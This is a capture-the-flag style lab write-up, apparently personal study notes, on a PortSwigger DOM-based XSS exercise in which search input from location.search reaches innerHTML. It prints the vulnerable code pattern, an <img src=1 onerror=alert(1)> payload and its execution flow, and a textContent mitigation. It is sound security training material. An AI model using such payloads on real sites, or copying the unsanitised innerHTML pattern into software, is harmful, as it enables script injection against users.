# Lab05 - DOM XSS in innerHTML Sink Using Source location.search

## Objective

Exploit a DOM-Based XSS vulnerability where attacker-controlled data from:

```javascript
location.search
```

is written directly into:

```javascript
innerHTML
```

and execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Apprentice |
| Source | location.search |
| Sink | innerHTML |
| Context | Free HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Summary

| Component | Value |
|------------|------------|
| Vulnerability Type | DOM-Based XSS |
| Source | location.search |
| Sink | innerHTML |
| Payload | `<img src=1 onerror=alert(1)>` |
| Root Cause | User-controlled input inserted into innerHTML |

---

# Vulnerability Overview

The application reads the search parameter from:

```javascript
location.search
```

and inserts it into the DOM using:

```javascript
innerHTML
```

without sanitization.

---

# Vulnerable Pattern

```javascript
let query =
new URLSearchParams(
location.search
).get('search');

document.getElementById(
'searchMessage'
).innerHTML =
'You searched for: ' + query;
```

---

# Source → Sink Flow

```text
location.search
        ↓
URLSearchParams()
        ↓
query Variable
        ↓
innerHTML
        ↓
HTML Parsing
        ↓
JavaScript Execution
```

---

# Analysis

## Step 1

Open search functionality.

---

## Step 2

Submit a probe value.

Example:

```text
CANARY123
```

---

## Step 3

Open:

```text
DevTools
    ↓
Elements
```

---

## Step 4

Search for:

```text
CANARY123
```

---

Observation:

Input appears inside:

```html
<div id="searchMessage">
You searched for: CANARY123
</div>
```

---

## Step 5

Determine Context

Input appears inside:

```text
Free HTML Context
```

---

Important:

```text
No Breakout Needed
```

because input is already being parsed as HTML.

---

# Full Payload(s) Used

## Probe Value

```text
CANARY123
```

---

## Final Payload

```html
<img src=1 onerror=alert(1)>
```

---

# Why Not Use <script>?

Many beginners try:

```html
<script>alert(1)</script>
```

---

However:

```javascript
element.innerHTML =
"<script>alert(1)</script>";
```

does NOT execute.

Modern browsers block dynamically inserted:

```html
<script>
```

tags inside:

```javascript
innerHTML
```

---

# Why The Payload Works

Payload:

```html
<img src=1 onerror=alert(1)>
```

---

Execution Flow

```text
innerHTML Receives Payload
        ↓
Browser Creates Image Element
        ↓
src=1 Fails To Load
        ↓
onerror Event Fires
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine where search input appears.

---

## Canary Test

Used:

```text
CANARY123
```

---

Observed:

```html
<div>
CANARY123
</div>
```

inside:

```text
Live DOM
```

---

## Key Observation

Input is placed directly into:

```javascript
innerHTML
```

---

## Important Realization

Context is:

```text
Free HTML Context
```

Therefore:

```text
No Breakout Required
```

---

## Payload Selection

Chosen:

```html
<img src=1 onerror=alert(1)>
```

because:

```text
Reliable
Works In innerHTML
Triggers Automatically
```

---

## Result

```javascript
alert(1)
```

executed successfully.

Lab solved.

---

# Mitigation

Avoid:

```javascript
innerHTML
```

for untrusted data.

Use:

```javascript
textContent
```

or

```javascript
createTextNode()
```

instead.

---

# Related Theory

- 14-what-is-dom-based-xss.md
- 15-sources-and-sinks.md
- 16-testing-dom-xss.md

---

# Key Learnings

- innerHTML is one of the most dangerous DOM sinks.
- Context determines payload choice.
- `<script>` often fails inside innerHTML.
- Event handlers are usually preferred.